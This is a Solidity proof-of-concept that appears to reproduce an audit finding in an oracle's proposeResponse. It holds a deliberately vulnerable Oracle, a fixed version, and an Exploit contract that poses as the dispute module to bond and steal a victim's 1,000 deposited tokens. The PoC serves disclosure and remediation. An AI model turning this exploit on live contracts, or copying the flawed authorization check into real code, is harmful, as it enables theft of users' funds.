// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Wonderland Prophet Oracle.proposeResponse — Trail of Bits, May 2024.
    The caller may be the request's dispute module instead of the proposer.
    Anyone can point disputeModule at themselves, name Alice as proposer,
    and the shared response module bonds Alice's deposited balance.
    Alice's 1,000 tokens move to the attacker's module. She cannot withdraw.
*/

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

struct Request {
    address responseModule;
    address disputeModule;
    address accounting;
    bytes32 requestId;
}

struct Response {
    address proposer;
    bytes32 requestId;
}

interface IResponseModule {
    function propose(Request calldata request, Response calldata response, address caller) external;
}

contract Token is IERC20 {
    string public symbol = "BOND";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Accounting {
    Token public token;
    address public module;
    mapping(address => uint256) public freeBalance;
    mapping(address => uint256) public bonded;

    constructor(Token _token) {
        token = _token;
    }

    function setModule(address _module) external {
        module = _module;
    }

    function credit(address user, uint256 amount) external {
        freeBalance[user] += amount;
    }

    function bond(address user, address recipient) external returns (uint256 amt) {
        require(msg.sender == module, "module");
        amt = freeBalance[user];
        require(amt > 0, "empty");
        freeBalance[user] = 0;
        bonded[user] += amt;
        require(token.transfer(recipient, amt), "bond");
    }

    function withdraw(address user) external returns (uint256 amt) {
        amt = freeBalance[user];
        require(amt > 0, "bonded");
        freeBalance[user] = 0;
        require(token.transfer(user, amt), "wd");
    }
}

contract ResponseModule is IResponseModule {
    uint256 public lastBonded;

    function propose(Request calldata request, Response calldata response, address caller) external {
        uint256 amt = Accounting(request.accounting).bond(response.proposer, caller);
        lastBonded = amt;
    }
}

contract Oracle {
    error Oracle_InvalidResponseBody();
    error Oracle_AlreadyFinalized(bytes32 requestId);

    event ResponseProposed(bytes32 requestId, bytes32 responseId, Response response, uint256 blockNumber);

    mapping(bytes32 => uint128) public createdAt;
    mapping(bytes32 => uint128) public finalizedAt;
    mapping(bytes32 => bytes) internal _participants;
    mapping(bytes32 => bytes) internal _responseIds;

    function proposeResponse(Request calldata _request, Response calldata _response)
        external
        returns (bytes32 _responseId)
    {
        _responseId = _validateResponse(_request, _response);
        // @> VULN: the request's dispute module may bond any proposer, not only msg.sender
        if (msg.sender != _response.proposer && msg.sender != address(_request.disputeModule)) {
            revert Oracle_InvalidResponseBody();
        }
        if (createdAt[_responseId] != 0) {
            revert Oracle_InvalidResponseBody();
        }
        if (finalizedAt[_response.requestId] != 0) {
            revert Oracle_AlreadyFinalized(_response.requestId);
        }
        _participants[_response.requestId] = abi.encodePacked(_participants[_response.requestId], _response.proposer);
        IResponseModule(_request.responseModule).propose(_request, _response, msg.sender);
        _responseIds[_response.requestId] = abi.encodePacked(_responseIds[_response.requestId], _responseId);
        createdAt[_responseId] = uint128(block.number + 1);
        emit ResponseProposed(_response.requestId, _responseId, _response, block.number);
    }

    function _validateResponse(Request calldata, Response calldata _response) internal pure returns (bytes32) {
        return keccak256(abi.encode(_response.proposer, _response.requestId));
    }
}

contract OracleFixed {
    error Oracle_InvalidResponseBody();

    address public immutable canonicalDispute;
    Accounting public accounting;
    address public responseModule;

    constructor(address _canonicalDispute) {
        canonicalDispute = _canonicalDispute;
    }

    function proposeResponse(Request calldata _request, Response calldata _response) external returns (bytes32) {
        if (msg.sender != _response.proposer && msg.sender != canonicalDispute) {
            revert Oracle_InvalidResponseBody();
        }
        if (_request.disputeModule != canonicalDispute) revert Oracle_InvalidResponseBody();
        IResponseModule(_request.responseModule).propose(_request, _response, msg.sender);
        return keccak256(abi.encode(_response.proposer, _response.requestId));
    }
}

contract Exploit {
    address public constant ALICE = 0x000000000000000000000000000000000000a11c;
    bytes32 public constant REQUEST = keccak256("alice-request");

    Token public token;
    Accounting public accounting;
    ResponseModule public module;
    Oracle public oracle;
    uint256 public bondedAmt;
    uint256 public aliceFree;

    constructor() {
        token = new Token();
        accounting = new Accounting(token);
        module = new ResponseModule();
        oracle = new Oracle();
        accounting.setModule(address(module));
        token.mint(address(accounting), 1000 ether);
        accounting.credit(ALICE, 1000 ether);
    }

    function run() external {
        Request memory request = Request({
            responseModule: address(module),
            disputeModule: address(this),
            accounting: address(accounting),
            requestId: REQUEST
        });
        Response memory response = Response({proposer: ALICE, requestId: REQUEST});
        aliceFree = accounting.freeBalance(ALICE);
        oracle.proposeResponse(request, response);
        bondedAmt = module.lastBonded();
        uint256 aliceAfter = accounting.freeBalance(ALICE);
        uint256 attackerBal = token.balanceOf(address(this));
        require(aliceFree == 1000 ether, "alice before");
        require(bondedAmt == 1000 ether, "bonded");
        require(aliceAfter == 0, "alice after");
        require(accounting.bonded(ALICE) == 1000 ether, "bond record");
        require(attackerBal == 1000 ether, "attacker");
        require(token.balanceOf(address(accounting)) == 0, "accounting");
    }
}
